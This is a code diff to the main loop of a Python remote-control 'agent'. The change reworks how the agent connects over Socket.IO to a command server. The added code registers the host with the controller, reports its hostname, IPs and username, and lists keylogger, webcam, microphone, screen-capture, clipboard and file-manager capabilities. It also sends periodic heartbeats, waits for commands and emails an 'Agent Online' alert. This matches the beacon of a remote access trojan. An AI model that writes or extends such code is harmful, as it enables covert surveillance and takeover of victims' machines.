@@ -14032,23 +14032,186 @@ def agent_main():
                 
                 # Connect with async or sync mode
                 if SOCKETIO_ASYNC_MODE:
-                    # AsyncClient requires async connect
-                    # Use asyncio.run to create a new event loop for connection
-                    async def _async_connect():
-                        await sio.connect(SERVER_URL, wait_timeout=10)
+                    # AsyncClient - Run EVERYTHING in ONE event loop
+                    async def _async_main_loop():
+                        """Main async loop - connect, register, heartbeat, and wait in single event loop"""
+                        try:
+                            # Step 1: Connect
+                            log_message("[ASYNC] Connecting with AsyncClient...")
+                            await sio.connect(SERVER_URL, wait_timeout=10)
+                            log_message("[ASYNC] ✅ Connected successfully!")
+                            
+                            # Step 2: Register agent
+                            log_message(f"[ASYNC] Registering agent {agent_id}...")
+                            await sio.emit('agent_connect', {
+                                'agent_id': agent_id,
+                                'hostname': socket.gethostname(),
+                                'platform': platform.system(),
+                                'os_version': platform.release(),
+                                'ip_address': get_local_ip(),
+                                'public_ip': get_public_ip(),
+                                'username': os.getenv('USERNAME') or os.getenv('USER') or 'unknown',
+                                'version': '2.1',
+                                'capabilities': {
+                                    'screen': True,
+                                    'camera': CV2_AVAILABLE,
+                                    'audio': PYAUDIO_AVAILABLE,
+                                    'keylogger': PYNPUT_AVAILABLE,
+                                    'clipboard': True,
+                                    'file_manager': True,
+                                    'process_manager': PSUTIL_AVAILABLE,
+                                    'webcam': CV2_AVAILABLE,
+                                    'webrtc': AIORTC_AVAILABLE
+                                },
+                                'timestamp': int(time.time() * 1000)
+                            })
+                            log_message(f"[ASYNC] ✅ Agent registered!")
+                            
+                            # Step 3: Send system info
+                            await sio.emit('agent_info', {
+                                'agent_id': agent_id,
+                                'platform': platform.system(),
+                                'hostname': platform.node(),
+                                'python_version': platform.python_version(),
+                                'capabilities': {
+                                    'screen_capture': MSS_AVAILABLE,
+                                    'camera': CV2_AVAILABLE,
+                                    'audio': PYAUDIO_AVAILABLE,
+                                    'input_control': PYNPUT_AVAILABLE,
+                                    'webrtc': AIORTC_AVAILABLE
+                                }
+                            })
+                            log_message(f"[ASYNC] ✅ System info sent!")
+                            
+                            # Step 4: Start heartbeat task in same loop
+                            async def async_heartbeat():
+                                while True:
+                                    try:
+                                        await sio.emit('agent_heartbeat', {
+                                            'agent_id': agent_id, 
+                                            'timestamp': time.time()
+                                        })
+                                        await asyncio.sleep(30)
+                                    except asyncio.CancelledError:
+                                        break
+                                    except Exception as e:
+                                        log_message(f"[HEARTBEAT] Error: {e}", "warning")
+                                        await asyncio.sleep(5)
+                            
+                            heartbeat_task = asyncio.create_task(async_heartbeat())
+                            log_message("[ASYNC] ✅ Heartbeat task started")
+                            
+                            # Step 5: Wait for events (blocks here)
+                            log_message("[ASYNC] Waiting for events...")
+                            await sio.wait()
+                            
+                        except asyncio.CancelledError:
+                            log_message("[ASYNC] Connection cancelled")
+                            raise
+                        except Exception as async_err:
+                            log_message(f"[ASYNC] Error in async loop: {async_err}")
+                            raise
                     
+                    # Run everything in ONE event loop
                     try:
-                        asyncio.run(_async_connect())
+                        asyncio.run(_async_main_loop())
                     except RuntimeError as re:
-                        # If there's already a running loop, try using it
                         log_message(f"[WARN] Event loop issue: {re}")
-                        # Fallback: try sync connection
-                        sio.connect(SERVER_URL, wait_timeout=10)
+                        raise
                 else:
-                    # Sync Client
+                    # Sync Client mode
                     sio.connect(SERVER_URL, wait_timeout=10)
-                
-                log_message("[OK] Connected to server successfully!")
+                    
+                    log_message("[OK] Connected to server successfully!")
+                    
+                    # Reset connection attempts and state
+                    connection_attempts = 0
+                    CONNECTION_STATE['connected'] = True
+                    CONNECTION_STATE['consecutive_failures'] = 0
+                    CONNECTION_STATE['reconnect_needed'] = False
+                    CONNECTION_STATE['force_reconnect'] = False
+                    
+                    # Email notify
+                    global EMAIL_SENT_ONLINE
+                    if not EMAIL_SENT_ONLINE:
+                        subject = f"Agent Online: {agent_id}"
+                        body = f"Agent {agent_id} connected\nHost: {platform.node()}\nPlatform: {platform.system()}"
+                        if send_email_notification(subject, body):
+                            EMAIL_SENT_ONLINE = True
+                    
+                    log_message("[INFO] Event handlers already registered and active")
+                    
+                    # Register agent (sync mode)
+                    try:
+                        log_message(f"[INFO] Registering agent {agent_id} with controller...")
+                        if not safe_emit('agent_connect', {
+                            'agent_id': agent_id,
+                            'hostname': socket.gethostname(),
+                            'platform': platform.system(),
+                            'os_version': platform.release(),
+                            'ip_address': get_local_ip(),
+                            'public_ip': get_public_ip(),
+                            'username': os.getenv('USERNAME') or os.getenv('USER') or 'unknown',
+                            'version': '2.1',
+                            'capabilities': {
+                                'screen': True,
+                                'camera': CV2_AVAILABLE,
+                                'audio': PYAUDIO_AVAILABLE,
+                                'keylogger': PYNPUT_AVAILABLE,
+                                'clipboard': True,
+                                'file_manager': True,
+                                'process_manager': PSUTIL_AVAILABLE,
+                                'webcam': CV2_AVAILABLE,
+                                'webrtc': AIORTC_AVAILABLE
+                            },
+                            'timestamp': int(time.time() * 1000)
+                        }):
+                            log_message(f"[ERROR] Failed to send agent registration", "error")
+                        else:
+                            log_message(f"[OK] Agent {agent_id} registration sent")
+                        
+                        # Send system info
+                        safe_emit('agent_info', {
+                            'agent_id': agent_id,
+                            'platform': platform.system(),
+                            'hostname': platform.node(),
+                            'python_version': platform.python_version(),
+                            'capabilities': {
+                                'screen_capture': MSS_AVAILABLE,
+                                'camera': CV2_AVAILABLE,
+                                'audio': PYAUDIO_AVAILABLE,
+                                'input_control': PYNPUT_AVAILABLE,
+                                'webrtc': AIORTC_AVAILABLE
+                            }
+                        })
+                        log_message(f"[OK] System info sent")
+                    except Exception as reg_error:
+                        log_message(f"[WARN] Failed to register: {reg_error}")
+                    
+                    # Start heartbeat thread
+                    def heartbeat_worker():
+                        try:
+                            while sio and sio.connected:
+                                try:
+                                    safe_emit('agent_heartbeat', {'agent_id': agent_id, 'timestamp': time.time()})
+                                    time.sleep(30)
+                                except KeyboardInterrupt:
+                                    break
+                                except Exception as e:
+                                    if "not a connected" not in str(e).lower():
+                                        log_message(f"Heartbeat error: {e}", "warning")
+                                    time.sleep(5)
+                                    break
+                        except KeyboardInterrupt:
+                            pass
+                        log_message("Heartbeat stopped")
+                    
+                    heartbeat_thread = threading.Thread(target=heartbeat_worker, daemon=True)
+                    heartbeat_thread.start()
+                    log_message("[OK] Heartbeat started")
+                    
+                    # Wait for events (sync mode)
+                    sio.wait()
                 if SOCKETIO_ASYNC_MODE:
                     log_message("[PERFORMANCE] Using AsyncClient with uvloop for maximum speed")
                 
@@ -14060,7 +14223,6 @@ def agent_main():
                 CONNECTION_STATE['force_reconnect'] = False
                 
                 # Email notify once when agent comes online
-                global EMAIL_SENT_ONLINE
                 if not EMAIL_SENT_ONLINE:
                     subject = f"Agent Online: {agent_id}"
                     body = (
